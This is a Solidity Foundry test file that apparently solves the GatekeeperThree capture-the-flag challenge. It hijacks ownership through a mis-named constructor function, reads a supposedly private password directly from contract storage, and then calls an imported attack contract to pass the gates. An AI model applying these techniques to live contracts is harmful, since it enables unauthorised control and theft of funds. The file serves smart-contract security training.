// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";

import {SimpleTrick, GatekeeperThree} from "../src/task_28/GatekeeperThree.sol";
import {GatekeeperThreeAttack} from "../src/task_28/GatekeeperThreeAttack.sol";

contract Task_28 is Test {
    SimpleTrick simpleTrick;
    GatekeeperThree gatekeeperThree;
    GatekeeperThreeAttack gatekeeperThreeAttack;

    function setUp() public {
        gatekeeperThree = new GatekeeperThree();
        gatekeeperThree.createTrick();

        gatekeeperThreeAttack = new GatekeeperThreeAttack(payable(address(gatekeeperThree)));
    }

    function test_GatekeeperThreeAttack() public {
        vm.prank(address(gatekeeperThreeAttack));
        gatekeeperThree.construct0r();

        bytes32 slot = bytes32(uint256(2));
        bytes32 password = vm.load(address(gatekeeperThree.trick()), slot);

        gatekeeperThreeAttack.run{value: 1 ether}(uint256(password));

        assertEq(gatekeeperThree.entrant(), tx.origin);
    }
}
